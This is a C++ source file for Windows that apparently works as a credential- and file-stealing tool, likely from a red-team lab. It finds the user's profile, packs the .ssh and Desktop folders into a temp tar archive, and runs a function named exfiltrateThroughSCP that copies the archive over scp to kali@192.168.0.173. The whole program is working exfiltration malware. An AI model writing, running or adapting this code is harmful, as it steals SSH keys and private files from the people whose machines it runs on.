#include <iostream>
#include <vector>
#include <string>
#include <cctype>
#include <Windows.h>
#include <sstream>
#include "command.h"
#include "helpers.h"
#include <Shlwapi.h>
#include <Shlobj.h> 

using namespace std;
using namespace raymii;

vector<string> stringSplit(string text, char split_char) {
    istringstream pathExecutables(text);
    vector<string> tokens;
    for (string each; getline(pathExecutables, each, split_char); tokens.push_back(each));
    return tokens;
}

void printVectorString(vector<string> vectorstring) {
    for (string each : vectorstring)
        cout << each << "\n";
}

vector<string> getPATH() {
    int bufferSize = 65535;
    string PATH;
    PATH.resize(bufferSize);
    bufferSize = GetEnvironmentVariableA("PATH", &PATH[0], bufferSize);
    if (!bufferSize) {
        cout << "Couldn't read PATH env variable";
    }
    return stringSplit(PATH, ';');
}

//string cmdWHERE() {
//    std::cout << Command::exec("echo 'Hello you absolute legends!'") << std::endl;
//}

string selectCompressionTool() {
    vector<string> listOfCompressionTools = { "7z.exe", "tar.exe" };
    /*vector<string> pathDirectories = getPATH();
    printVectorString(pathDirectories);
    for (string tool: listOfCompressionTools){
        if (std::find(pathDirectories.begin(), pathDirectories.end(), tool) != pathDirectories.end()) {
            return tool;
        }
    }*/
    //cmdWHERE();
    for (string tool: listOfCompressionTools){
        CommandResult result = Command::exec("where " + tool);
        if (result.output.find(tool) != string::npos) {
            return tool;
        }
    }
    return NULL;
}

void windowsTar(vector<string> directories, string destination) {
    string command = "tar -cvzf " + destination + " " + join(directories, " ");
    cout << "Command is " << command<<endl;
    CommandResult result = Command::exec(command);
}

void exfiltrateThroughSCP(string filename,string destination) {
    string command = "scp " + filename + " kali@192.168.0.173:" + destination;
    cout << "Command is " << command << endl;
    CommandResult result = Command::exec(command);
}

int main()
{
    WCHAR path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path))) {
        vector<string> interestingUserFolders = { ".ssh", "Desktop" };
        vector<string> interestingUserFoldersFullPath;
        for (string folder : interestingUserFolders) {
            interestingUserFoldersFullPath.push_back(wchar2string(path) + "\\" + folder);
        }
        printVectorString(interestingUserFoldersFullPath);
        string compressionTool = selectCompressionTool();
        string fullPath = wchar2string(path) + "\\AppData\\Local\\Temp\\rk3824.tar";
        cout << compressionTool << endl;
        if (compressionTool == "tar.exe") {
            windowsTar(interestingUserFoldersFullPath, fullPath);
        }
        exfiltrateThroughSCP(fullPath, "landing/rk3824.tar");
    }
}
